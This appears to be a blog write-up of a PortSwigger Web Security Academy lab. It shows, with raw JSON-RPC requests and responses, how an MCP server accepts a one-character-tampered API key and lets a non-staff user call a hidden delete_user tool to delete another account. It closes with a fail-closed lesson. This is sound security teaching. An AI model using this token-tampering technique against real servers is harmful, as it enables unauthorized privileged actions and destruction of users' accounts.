@@ -1,0 +1,281 @@
+---
+title: "MCP server authentication fails open"
+description: "PortSwigger Web Security Academy lab — an MCP server fails open on a tampered API key, letting a non-staff user reach the hidden delete_user tool and delete another account."
+date: "2026-11-25"
+difficulty: "practitioner"
+published: true
+---
+
+# MCP server authentication fails open
+
+[Lab link](https://portswigger.net/web-security/mcp/lab-mcp-server-authentication-fails-open)
+
+This is the fourth MCP lab and it builds on everything from the previous three. Start there if you haven't worked through them yet:
+
+- [SQL injection in an MCP server tool](https://portswigger.net/web-security/mcp/lab-sql-injection-in-an-mcp-tool) — [writeup](/writeups/portswigger/mcp-server-vulnerabilities/sql-injection-in-mcp-server-tool)
+- [Broken access control in an MCP server tool](https://portswigger.net/web-security/mcp/lab-broken-access-control-in-an-mcp-tool) — [writeup](/writeups/portswigger/mcp-server-vulnerabilities/broken-access-control-in-an-mcp-server-tool)
+- [MCP server hides tools without restricting them](https://portswigger.net/web-security/mcp/lab-mcp-server-hides-tools-without-restricting-them) — [writeup](/writeups/portswigger/mcp-server-vulnerabilities/mcp-server-hides-tools-without-restricting-them)
+
+---
+
+## Lab overview
+
+The lab is a shop with an MCP endpoint at `/mcp`. Your account page shows an API key, but the server handles tokens in a flawed way. The goal is to delete Carlos's account — even though `delete_user` is not listed for ordinary users.
+
+![The MCP server authentication fails open lab](/images/writeups/portswigger/mcp-failopen-shop.png)
+
+## Setting up the request
+
+Log in as `wiener:peter`. As before, there's no MCP client in the front end, so intercept a request in Burp Suite and send it to Repeater. Change the path to `/mcp`, set the method to `POST`, and add `Content-Type: application/json`.
+
+Add an `Authorization` header with the API key from your account page:
+
+```text
+Authorization: Bearer uXQ5ywPALkwwunr36LEY3ZECnc0zb25S
+```
+
+<div className="max-w-[420px] mx-auto">
+
+![Account page showing the API key](/images/writeups/portswigger/mcp-failopen-api-key.png)
+
+</div>
+
+<Callout type="tip" title="Hint">
+  Compare how the server responds to no token, to your own API key, and to a token that isn't a valid API key. The server's `initialize` instructions describe which kinds of token it accepts.
+</Callout>
+
+## Comparing the three token states
+
+### No token
+
+Send the `tools/list` request with no `Authorization` header and the server rejects it outright:
+
+```text
+HTTP/2 401 Unauthorized
+WWW-Authenticate: Bearer
+
+"Unauthorized"
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![401 Unauthorized with no token](/images/writeups/portswigger/mcp-failopen-no-token.png)
+
+</div>
+
+### Your own API key
+
+Add your valid key and the same request succeeds, listing only the ordinary tools:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "tools": [
+      {
+        "name": "list_products",
+        "title": "List products",
+        "description": "Lists the products currently for sale. Optionally filter by category, for example \"Gifts\".",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "category": {
+              "description": "Only return products in this category",
+              "type": "string"
+            }
+          },
+          "required": [],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "get_product",
+        "title": "Get product",
+        "description": "Gets the details of a single product by its ID.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "productId": {
+              "description": "The product ID",
+              "type": "string"
+            }
+          },
+          "required": ["productId"],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "get_account_details",
+        "title": "Get account details",
+        "description": "Gets the username and email address of your account.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {},
+          "required": [],
+          "additionalProperties": false
+        }
+      }
+    ]
+  }
+}
+```
+
+Unlike the previous lab, `delete_user` is not listed — but this lab still requires us to delete Carlos.
+
+## Reading the initialize instructions
+
+Following the hint, send an `initialize` call:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "method": "initialize",
+  "params": {
+    "protocolVersion": "2025-06-18",
+    "capabilities": {},
+    "clientInfo": {
+      "name": "repeater",
+      "version": "1.0"
+    }
+  }
+}
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "result": {
+    "protocolVersion": "2025-06-18",
+    "capabilities": {
+      "tools": {
+        "listChanged": false
+      }
+    },
+    "serverInfo": {
+      "name": "shop-mcp",
+      "version": "1.0.0"
+    },
+    "instructions": "Authenticate with the API key from your account page. OAuth access tokens issued for our partner API are also accepted."
+  }
+}
+```
+
+The instructions tell us that the API key from the account page is one accepted token — but not the only one. That detail matters in a moment.
+
+## Reaching the hidden tool
+
+Even though `delete_user` wasn't listed, try calling it with your own valid key:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "delete_user"
+  }
+}
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "You are not authorized to use this tool"
+      }
+    ],
+    "isError": true
+  }
+}
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![delete_user rejected with the valid API key](/images/writeups/portswigger/mcp-failopen-not-authorized.png)
+
+</div>
+
+So the tool exists, but a plain user key is not enough. Now for the interesting part: change the last character of the API key from `S` to `T`:
+
+```text
+Authorization: Bearer uXQ5ywPALkwwunr36LEY3ZECnc0zb25T
+```
+
+This is no longer a valid API key. Send the same `delete_user` call anyway:
+
+<div className="max-w-[720px] mx-auto">
+
+![Tampered API key gets past authentication and reveals the required argument](/images/writeups/portswigger/mcp-failopen-username-required.png)
+
+</div>
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "username is required"
+      }
+    ],
+    "isError": true
+  }
+}
+```
+
+An invalid token has passed the authorization check. The error now describes the tool's schema instead of refusing access — the authentication fails open.
+
+## Deleting Carlos
+
+Add the required `username` argument and keep the tampered key:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "delete_user",
+    "arguments": {
+      "username": "carlos"
+    }
+  }
+}
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "Deleted carlos"
+      }
+    ],
+    "isError": false
+  }
+}
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![Carlos deleted and the lab solved](/images/writeups/portswigger/mcp-failopen-solved.png)
+
+</div>
+
+Carlos was successfully deleted and the lab is solved.
+
+## Key takeaway
+
+The server performed two different checks and disagreed with itself. A missing token was rejected with `401`, but a garbage token was treated as authenticated — changing a single character was enough to reach the privileged tool. The `initialize` instructions even hinted that multiple token formats are accepted, which is exactly what made the malformed value worth trying. Authentication must fail closed: anything that isn't a verified credential belongs in the same bucket as no credential at all.
